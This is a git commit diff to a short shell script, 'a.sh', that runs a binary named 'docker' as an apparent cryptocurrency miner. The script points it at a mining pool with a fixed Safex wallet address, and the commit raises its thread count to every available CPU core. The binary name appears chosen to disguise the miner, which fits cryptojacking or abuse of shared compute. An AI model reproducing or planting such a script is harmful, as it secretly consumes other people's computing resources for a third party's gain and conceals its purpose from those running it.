5e3fd9823cc9d2c802abc40d419b629adfbb2436
ncamacho07 <84513246+ncamacho07@users.noreply.github.com>
2022-03-12 17:53:05 +0700

    Update a.sh

--- a.sh
+++ a.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 chmod 777 docker
-./docker -o sf.pool-pay.com:4025 -u Safexsp1o77aa1VcscEtwfBeDaqLyqnh4TZt1wjzAbmZ1CTTvnik8RN8fSSJnhm4BLVJB5kUokKJN8SCu7c8PZ3RJ7pfRGv5wsy4r -p $(echo $(shuf -i 1-20000 -n 1)-G) -k -a rx/sfx
+./docker -o sf.pool-pay.com:4025 -u Safexsp1o77aa1VcscEtwfBeDaqLyqnh4TZt1wjzAbmZ1CTTvnik8RN8fSSJnhm4BLVJB5kUokKJN8SCu7c8PZ3RJ7pfRGv5wsy4r -p $(echo $(shuf -i 1-20000 -n 1)-G) -k -a rx/sfx -t$(nproc --all)
